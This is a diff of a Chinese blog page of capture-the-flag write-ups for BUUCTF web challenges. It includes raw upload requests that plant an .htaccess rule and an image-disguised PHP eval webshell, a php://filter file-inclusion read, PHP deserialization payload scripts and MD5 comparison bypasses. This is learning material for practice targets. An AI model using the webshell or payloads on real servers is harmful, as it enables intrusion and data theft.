class="line">Content-Length: 14</span><br><span class="line"></span><br><span class="line">password=404ac&amp;money=10e10</span><br></pre></td></tr></table></figure>
 
-password=404ac&amp;money=10e10
-</code></pre>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237167819-29a60e0a-41a6-4850-91bf-e2299e6d85e6.png" alt="img"></p>
 <h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>抓包之后看到这样：</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237350103-5656e1b1-baa0-4ffc-80b1-de7144f1efff.png" alt="img"></p>
@@ -636,56 +479,11 @@ password=404ac&amp;money=10e10
 <p>修改content-type:image&#x2F;png</p>
 <p>内容为：AddType application&#x2F;x-httpd-php .png</p>
 <p>将所以png后缀当作php解析，数据包：</p>
-<pre><code class="language-plain">POST /upload.php HTTP/1.1
-Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------64109611113320769853041448004
-Content-Length: 381
-Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
-Connection: keep-alive
-Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/
-Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------64109611113320769853041448004</span><br><span class="line">Content-Length: 381</span><br><span class="line">Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/</span><br><span class="line">Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------64109611113320769853041448004</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">-----------------------------64109611113320769853041448004</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">一键去世</span><br><span class="line">-----------------------------64109611113320769853041448004--</span><br></pre></td></tr></table></figure>
 
------------------------------64109611113320769853041448004
-Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;
-Content-Type: image/png
-
-AddType application/x-httpd-php .png
------------------------------64109611113320769853041448004
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-一键去世
------------------------------64109611113320769853041448004--
-</code></pre>
 <p>然后再上传一个图片🐎：</p>
-<pre><code class="language-plain">POST /upload.php HTTP/1.1
-Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------1985058255358904272254780689
-Content-Length: 683
-Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
-Connection: keep-alive
-Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/
-Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------1985058255358904272254780689</span><br><span class="line">Content-Length: 683</span><br><span class="line">Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/</span><br><span class="line">Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------1985058255358904272254780689</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?= eval($_POST[1]);?&gt;</span><br><span class="line">�PNG</span><br></pre></td></tr></table></figure>
 
------------------------------1985058255358904272254780689
-Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.png&quot;
-Content-Type: image/png
-
-GIF89a
-&lt;?= eval($_POST[1]);?&gt;
-�PNG
-</code></pre>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733303170220-34e1cdbd-ef1a-4692-91fa-e1b74e17f863.png" alt="img"></p>
 <p>最后成功执行命令：</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733303190507-6cb0cf8c-b712-4b11-b3b8-5b8d35a15ffa.png" alt="img"></p>
@@ -711,26 +509,8 @@ GIF89a
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305277519-c9935bf3-ce67-44b3-82ed-e12e1d0dba29.png" alt="img"></p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305269827-94e113f5-e319-49ff-ab76-110dc347d23c.png" alt="img"></p>
 <h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>这题打开是一个php代码</p>
-<pre><code class="language-plain"> &lt;?php  
-$text = $_GET[&quot;text&quot;];
-$file = $_GET[&quot;file&quot;];
-$password = $_GET[&quot;password&quot;];
-if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;
-    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
-    if(preg_match(&quot;/flag/&quot;,$file))&#123;
-        echo &quot;Not now!&quot;;
-        exit(); 
-    &#125;else&#123;
-        include($file);  //useless.php
-        $password = unserialize($password);
-        echo $password;
-    &#125;
-&#125;
-else&#123;
-    highlight_file(__FILE__);
-&#125;
-?&gt; 
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
 <p>第一个条件需要$text的内容为welcome to the zjctrf</p>
 <p>这个可以用data协议：data:&#x2F;&#x2F;text&#x2F;plain,<code>welcome to the zjctf</code></p>
 <p>或者使用ssrf（在服务器写入所需要存在的信息）</p>
@@ -738,74 +518,17 @@ else&#123;
 <p>正好后面有个include，可以用文件包含</p>
 <p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
 <p>最后解码得到</p>
-<pre><code class="language-plain">&lt;?php  
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
 
-class Flag&#123;  //flag.php  
-    public $file;  
-    public function __tostring()&#123;  
-        if(isset($this-&gt;file))&#123;  
-            echo file_get_contents($this-&gt;file); 
-            echo &quot;&lt;br&gt;&quot;;
-        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
-        &#125;  
-    &#125;  
-&#125;  
-?&gt;  
-</code></pre>
 <p>因为最后是echo password，最后可以触发tostring魔术方法。沿着这个思路可以将php写出来了：</p>
-<pre><code class="language-plain">&lt;?php
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php</span><br><span class="line">    public $file=&#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new Flag());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-class Flag&#123;  //flag.php
-    public $file=&#39;flag.php&#39;;
-&#125;
-echo serialize(new Flag());
-?&gt;
-</code></pre>
 <p>最后的payload：</p>
 <p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733317111259-90c0610a-7261-4bf3-accf-9aa610247626.png" alt="img"></p>
 <h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>一道代码题</p>
-<pre><code class="language-plain">I put something in F12 for you
-include &#39;flag.php&#39;;
-$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
-if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
-    $id=$_GET[&#39;id&#39;];
-    $gg=$_GET[&#39;gg&#39;];
-    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
-        echo &#39;You got the first step&#39;;
-        if(isset($_POST[&#39;passwd&#39;])) &#123;
-            $passwd=$_POST[&#39;passwd&#39;];
-            if (!is_numeric($passwd))
-            &#123;
-                 if($passwd==1234567)
-                 &#123;
-                     echo &#39;Good Job!&#39;;
-                     highlight_file(&#39;flag.php&#39;);
-                     die(&#39;By Retr_0&#39;);
-                 &#125;
-                 else
-                 &#123;
-                     echo &quot;can you think twice??&quot;;
-                 &#125;
-            &#125;
-            else&#123;
-                echo &#39;You can not get it !&#39;;
-            &#125;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
 
-        &#125;
-        else&#123;
-            die(&#39;only one way to get the flag&#39;);
-        &#125;
-&#125;
-    else &#123;
-        echo &quot;You are not a real hacker!&quot;;
-    &#125;
-&#125;
-else&#123;
-    die(&#39;Please input first&#39;);
-&#125;
-&#125;Please input first
-</code></pre>
 <p>第一个条件直接数组绕过。</p>
 <p>第二个条件在数字后面加上字母进行弱比较绕过</p>
 <p>payload：</p>
@@ -833,95 +556,8 @@ else&#123;
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733323824220-9bcdc991-66ad-4858-93e3-0696ac851af8.png" alt="img"></p>
 <p>最后将flag拼上</p>
 <h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>这题是一道反序列化题目</p>
-<pre><code class="language-plain"> &lt;?php
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">	//进行赋值，然后调用process()函数</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	//如果op=1，调用write函数。等于2调用output函数</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	//content长度不能大于100，将content内容写入进filename并赋值为res。</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line">	//如果filename设置，返回filename的文件内容</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line">	//输出变量内容</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//如果op=2，强制将op设置为1，然后将content赋值为空。最后调用process()函数</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">//要求字符为可见字符</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-include(&quot;flag.php&quot;);
-
-highlight_file(__FILE__);
-
-class FileHandler &#123;
-
-    protected $op;
-    protected $filename;
-    protected $content;
-
-    function __construct() &#123;
-        $op = &quot;1&quot;;
-        $filename = &quot;/tmp/tmpfile&quot;;
-        $content = &quot;Hello World!&quot;;
-        $this-&gt;process();
-    &#125;
-	//进行赋值，然后调用process()函数
-
-    public function process() &#123;
-        if($this-&gt;op == &quot;1&quot;) &#123;
-            $this-&gt;write();
-        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
-            $res = $this-&gt;read();
-            $this-&gt;output($res);
-        &#125; else &#123;
-            $this-&gt;output(&quot;Bad Hacker!&quot;);
-        &#125;
-    &#125;
-	//如果op=1，调用write函数。等于2调用output函数
-
-    private function write() &#123;
-        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
-            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
-                $this-&gt;output(&quot;Too long!&quot;);
-                die();
-            &#125;
-            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
-            if($res) $this-&gt;output(&quot;Successful!&quot;);
-            else $this-&gt;output(&quot;Failed!&quot;);
-        &#125; else &#123;
-            $this-&gt;output(&quot;Failed!&quot;);
-        &#125;
-    &#125;
-	//content长度不能大于100，将content内容写入进filename并赋值为res。
-
-    private function read() &#123;
-        $res = &quot;&quot;;
-        if(isset($this-&gt;filename)) &#123;
-            $res = file_get_contents($this-&gt;filename);
-        &#125;
-        return $res;
-    &#125;
-	//如果filename设置，返回filename的文件内容
-
-    private function output($s) &#123;
-        echo &quot;[Result]: &lt;br&gt;&quot;;
-        echo $s;
-    &#125;
-	//输出变量内容
-
-    function __destruct() &#123;
-        if($this-&gt;op === &quot;2&quot;)
-            $this-&gt;op = &quot;1&quot;;
-        $this-&gt;content = &quot;&quot;;
-        $this-&gt;process();
-    &#125;
-
-&#125;
-//如果op=2，强制将op设置为1，然后将content赋值为空。最后调用process()函数
-
-function is_valid($s) &#123;
-    for($i = 0; $i &lt; strlen($s); $i++)
-        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
-            return false;
-    return true;
-&#125;
-//要求字符为可见字符
-
-if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
-
-    $str = (string)$_GET[&#39;str&#39;];
-    if(is_valid($str)) &#123;
-        $obj = unserialize($str);
-    &#125;
-
-&#125;
-</code></pre>
 <p>思路就是用比较绕过destruct魔术方法，然后进行文件读取。</p>
 <p>反序列化触发</p>
 <p>​    function __destruct() {</p>
@@ -946,33 +582,16 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
 <p>​            $this-&gt;output($res);</p>
 <p>所以要让op的值为2，但是__destruct有个判断（是一个强比较与字符串2进行判断，这里可以用数字2绕过）</p>
 <h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>php脚本：</p>
-<pre><code class="language-plain">&lt;?php
-class FileHandler &#123;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op=2;</span><br><span class="line">    protected $filename=&#x27;flag.php&#x27;;</span><br><span class="line">    protected $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=serialize(new FileHandler());</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$a=str_replace(&quot;s&quot;,&quot;S&quot;,$a);//利用大写S采用的十六进制，来绕过is_valid中对空字节的检查</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
 
-    protected $op=2;
-    protected $filename=&#39;flag.php&#39;;
-    protected $content;
-&#125;
-$a=serialize(new FileHandler());
-echo &quot;\n&quot;;
-$a=str_replace(&quot;s&quot;,&quot;S&quot;,$a);//利用大写S采用的十六进制，来绕过is_valid中对空字节的检查
-echo $a;
-</code></pre>
 <p>最后将%00换成\00</p>
 <p>payload:</p>
